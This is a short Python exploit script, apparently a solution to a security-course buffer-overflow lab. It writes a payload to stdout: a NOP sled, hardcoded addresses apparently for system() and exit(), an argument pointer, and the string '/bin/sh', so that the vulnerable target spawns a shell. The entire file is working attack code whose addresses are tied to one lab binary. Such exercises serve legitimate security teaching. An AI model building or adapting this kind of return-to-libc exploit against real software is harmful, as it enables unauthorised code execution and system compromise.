import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
nops = b'\x90' * 22
payload = b'/bin/sh'
syscall = pack("<I", 0x8051950)
exitCall = pack("<I", 0x807a064)
sysArg = pack("<I", 0xfff6fef8)
# Launch the attack!
sys.stdout.buffer.write(nops + syscall + exitCall + sysArg + payload)
